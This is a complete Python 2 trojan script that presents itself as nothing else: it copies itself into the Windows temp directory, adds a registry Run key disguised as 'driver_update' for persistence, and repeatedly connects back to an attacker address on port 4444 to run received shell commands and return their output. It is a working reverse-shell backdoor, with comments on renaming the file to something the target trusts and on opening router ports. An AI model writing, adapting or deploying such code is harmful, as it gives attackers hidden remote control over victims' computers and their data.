import socket
import time
import subprocess
import tempfile
import os
#import base64

# my_address_noip = socket.gesthostbyname("YOU ID FOR NO-IP") # No-IP Connection
my_address = '192.168.0.13' # Local IP our External IP (OPEN YOUR ROUTER DOOR)
my_exiting = 4444 # OPEN YOUR ROUTER DOOR

arqname = 'trojan.exe' # Rename with a trusted filename of your target.
tempdir = tempfile.gettempdir()
directory = os.path.dirname(os.path.abspath(__file__))

def autorun():
    try:
        os.system("copy " + arqname + " " + tempdir)
    except:
        print 'Erro on copy'
        pass

    try:
        FNULL = open(os.devnull, 'w')
        subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
                         " /v driver_update /d " + tempdir + "\\" + arqname, stdout=FNULL, stderr=FNULL)
    except:
        print 'Registration Error'
        pass

def connect(my_address, my_exiting):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((my_address, my_exiting))
        s.send('<<<<[!] Connection received [!]>>>>\n')
        return s
    except Exception as e:
        print 'Bad... Error on connection:', e
        return None

#def base64_dec(strings):
#        return base64.b64decode(strings)

def listen(s):
    try:
        while True:
            data = s.recv(1024)
            if data[:-1] == '/exit':
                s.close()
                exit(0)
            else:
                cmd(s, data[:-1])
    except:
        print 'Bad... Error on listen'
        error(s)

def cmd(s, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        exiting = proc.stdout.read() + proc.stderr.read()
        s.send(exiting+'\n')
    except:
        print 'Bad... Error on cmd'
        error(s)

def error(s):
    if s:
        s.close()
    main()

def main():
    while True:
        s_connect = connect(my_address, my_exiting)
        if s_connect:
            listen(s_connect)
        else:
            print 'Error on connection, Trying connect again'
            time.sleep(5)

if directory.lower() != tempdir.lower():
    autorun()
main()
